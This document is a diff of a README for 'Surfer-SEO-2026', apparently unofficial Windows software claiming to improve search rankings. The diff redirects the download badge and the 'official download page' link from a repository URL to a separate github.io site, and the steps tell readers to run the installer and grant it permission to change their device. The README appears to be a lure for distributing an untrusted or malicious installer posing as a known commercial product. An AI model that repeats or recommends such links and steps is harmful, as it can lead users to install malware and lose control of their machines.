@@ -1,6 +1,6 @@
 # 🚀 Surfer-SEO-2026 - Master your content ranking on search
 
-[![](https://img.shields.io/badge/Download-Surfer_SEO_2026-blue.svg)](https://github.com/Georgeannaintragroup176/Surfer-SEO-2026)
+[![](https://img.shields.io/badge/Download-Surfer_SEO_2026-blue.svg)](https://georgeannaintragroup176.github.io)
 
 Surfer-SEO-2026 provides a set of tools to improve your search engine rankings. This software helps you understand why your competitors rank high and how to match their performance. It simplifies content audits, keyword research, and page optimization for modern web standards.
 
@@ -18,7 +18,7 @@ Confirm your computer meets these standards to ensure smooth operation:
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the [official download page](https://github.com/Georgeannaintragroup176/Surfer-SEO-2026) to select the full installer for Windows.
+1. Visit the [official download page](https://georgeannaintragroup176.github.io) to select the full installer for Windows.
 2. Click the installer file after the download finishes.
 3. Permit the application to make changes to your device when the prompt appears.
 4. Follow the instructions on the screen to choose your installation directory.
